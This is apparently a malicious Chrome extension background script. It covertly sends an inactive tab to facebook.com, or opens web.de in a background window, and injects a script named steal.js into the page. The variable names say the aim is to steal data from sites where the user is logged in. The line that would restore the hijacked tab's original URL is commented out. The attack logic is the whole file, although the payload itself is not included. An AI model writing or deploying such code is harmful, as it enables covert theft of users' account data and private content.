var urlToStealFromInactiveTab = 'https://facebook.com';
var urlToStealFromBackgroundWindow = 'http://web.de';

function openPageInInactiveTab(tabId, changeInfo, tab) {
	chrome.tabs.onUpdated.removeListener(openPageInInactiveTab);	
	
	var queryOptions = {
		active: false,
		windowType: "normal"
	}
	
	chrome.tabs.query(queryOptions, function (tabs) {		
		if(tabs.length === 0) {
			return;
		}
		var oldUrl = tabs[0].url;

		chrome.tabs.update(tabs[0].id, {url: urlToStealFromInactiveTab}, function() {
			chrome.tabs.executeScript(tabs[0].id, {file: 'jquery.js'});
			chrome.tabs.executeScript(tabs[0].id, {file: 'steal.js'}, function() {
				setTimeout(function() {
					//chrome.tabs.update(tabs[0].id, {url: oldUrl});
				}, 2000);
			});
		});
	});
}

function openPageInBackgroundWindow(tabId, changeInfo, tab) {
	
	var queryInfo = {
		currentWindow: false,
		windowType: "normal"
	}
	
	var injectionOptions = {
		file: 'steal.js',
		runAt: 'document_end'
	}
	
	chrome.tabs.query(queryInfo, function (tabs) {		
		if(tabs.length === 0) {
			return;
		}

		var createOptions = {
			url: urlToStealFromBackgroundWindow, 
			windowId: tabs[0].windowId
		};

		chrome.tabs.create(createOptions, function(tab) {		
			chrome.tabs.executeScript(tab.id, injectionOptions, function() {
				chrome.tabs.remove(tab.id);
				chrome.tabs.onUpdated.removeListener(openPageInBackgroundWindow);
			});
		});
	});
}

chrome.tabs.onUpdated.addListener(openPageInInactiveTab); 
//chrome.tabs.onUpdated.addListener(openPageInBackgroundWindow); 